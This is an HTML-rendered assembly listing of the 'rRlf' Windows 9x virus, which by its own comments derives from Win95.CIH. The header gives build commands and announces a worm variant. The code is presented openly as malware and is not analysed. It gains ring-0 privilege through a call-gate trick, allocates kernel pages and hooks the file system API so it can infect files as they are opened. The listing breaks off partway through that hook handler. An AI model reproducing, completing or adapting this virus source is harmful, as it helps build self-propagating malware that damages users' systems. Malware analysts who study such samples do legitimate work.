<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win9x.Apop.1086 - rRlf.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; rRlf Virus by Jimmy@rRlf.de</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Eigentlicher Virus Code vom Win95.CIH Virus,</span><span class="sc0">
</span><span class="sc1">; verbesserte Einsprungspunkte und Call Mechanismen</span><span class="sc0">
</span><span class="sc1">; Bessere Call Coordination, ohne Bugs</span><span class="sc0">
</span><span class="sc1">; wird ab 6.Aug2001 von AVp als Win95.CIH erkannt</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Entstand: Aus Ehrfurcht vom alten Win.Cih Virus.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  </span><span class="sc0">
</span><span class="sc1">; Gibt es demnächst auch als I-Worm. Variante</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc1">; Kompillierung </span><span class="sc0">
</span><span class="sc1">; Tasm32 -ml -m2 rRlf.asm</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Tlink32 -Tpe rRlf.asm import32.lib</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">rRlf.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">drp.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ilb.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ios.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">isp.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ior.inc</span><span class="sc0">

</span><span class="sc5">DCB_type_cdrom</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">        </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc5">rRlf_Start</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">rRlf_Init</span><span class="sc0">
</span><span class="sc5">rRlf_Init</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">       </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">rRlf_Init</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">set_seh</span><span class="sc0">                       
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exit_Main</span><span class="sc0">
</span><span class="sc5">set_seh</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ESP</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">get_r0</span><span class="sc0">                        

                </span><span class="sc6">call</span><span class="sc0">      </span><span class="sc5">ring0_proc</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                               
</span><span class="sc5">get_r0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">ESI</span><span class="sc0">                        

                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EBX</span><span class="sc0">                       
                </span><span class="sc6">sgdt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ESP</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">EBX</span><span class="sc0">

                </span><span class="sc6">sldt</span><span class="sc0">      </span><span class="sc8">AX</span><span class="sc0">                        
                </span><span class="sc6">and</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">111b</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">Exit_Main</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">               

                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shrd</span><span class="sc0">      </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

                </span><span class="sc7">fild</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">                

                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">                
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1110110000000000b</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">
                </span><span class="sc6">shld</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">9Ah</span><span class="sc0">                        
                </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">        </span><span class="sc2">100b</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">               

                </span><span class="sc7">fistp</span><span class="sc0">     </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                

</span><span class="sc5">Exit_Main</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">FS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                
                </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">68h</span><span class="sc0">                        

</span><span class="sc5">Exit_VA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0">

                </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">

</span><span class="sc5">ring0_proc</span><span class="sc4">:</span><span class="sc0">                                
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DR3</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'rRlf'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc5">exit_r0</span><span class="sc0">

                
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PAGEFIXED</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PAGEZEROINIT</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc0">                   
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc0">                    
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc0">                    
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc0">                    
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc0">                     
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">PG_SYS</span><span class="sc0">                  
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc5">virpages</span><span class="sc0">                

</span><span class="sc5">PatchOffset</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0">

                </span><span class="sc5">VMMcall</span><span class="sc0">   </span><span class="sc5">PageAllocate</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">               
                </span><span class="sc6">jz</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_r0</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0BBh</span><span class="sc0">                    
</span><span class="sc5">Obj_Tbl_VA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc2">40018Fh</span><span class="sc0">                 

                </span><span class="sc9">db</span><span class="sc0">        </span><span class="sc2">0BAh</span><span class="sc0">                   
</span><span class="sc5">MainLen_Offset</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">        </span><span class="sc5">virusLen</span><span class="sc0">

               
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc5">copy_next</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">       </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virusLen</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">make_clear_copy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">       </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">copy_next</span><span class="sc0">

</span><span class="sc5">make_clear_copy</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

               
                </span><span class="sc6">lea</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">virbuffer</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">PatchOffset</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20CDh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">00010053h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">IFSAPI_handler</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc4">)</span><span class="sc0">
              
                </span><span class="sc6">push</span><span class="sc0">      </span><span class="sc8">ESI</span><span class="sc0">
                </span><span class="sc5">VxDcall</span><span class="sc0">   </span><span class="sc5">IFSMGR</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">InstallFileSystemApiHook</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">       </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc0">
                
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">old_IFSAPI</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

              
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'rRlf'</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">       </span><span class="sc8">DR3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">

</span><span class="sc5">exit_r0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">                                

</span><span class="sc5">Loader_Size</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">rRlf_Start</span><span class="sc0">


</span><span class="sc5">IFSAPI_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc5">get_addr</span><span class="sc0">

</span><span class="sc5">get_addr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">EBP</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">        </span><span class="sc8">EBP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">get_addr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">semafore</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc5">Exit_IFSAPI_handler</span><span class="sc0">

               
                </span><span class="sc6">inc</span><span class="sc0">        </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc0">

               
                </span><span class="sc6">cmp</span><span class="sc0">        </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IFSFN_OPEN</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">        </span><span class="sc5">End_IFSAPI_handler</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">
                </span><span class="sc6">out</span><span class="sc0">        </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">         </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">       </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">jp</span><span class="sc0">         </span><span class="sc5">work</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ctr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">        </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">        </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">work</span><span class="sc0">


                </span><span class="sc6">dec</span><span class="sc0">        </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fuck</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">fuck</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc0">
        
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">drp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EDI</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ilb</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.DRP_ilb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc5">.DRP_LGN</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DRP_IFS</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">        </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc0">
                </span><span class="sc6">repz</span><span class="sc0">       </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc5">VxDcall</span><span class="sc0">    </span><span class="sc5">IOS_Device_ID</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IOS_Register</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">EDI</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc0">       
                </span><span class="sc6">test</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">         </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">work</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">isp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">IFSAPI_handler</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc5">.ISP_func</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ISP_GET_FIRST_NEXT_DCB</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">        </span><span class="sc4">[</span><span class="sc8">EBX</span><span class="sc4">]</span><span class="sc5">.ISP_gfnd_dcb_type</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">DCB_type_cdrom</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">       </span><span class="sc8">EBX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">       </span><span class="sc8">EAX</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">        </span><span class="sc8">EBX</span><span class="sc0">

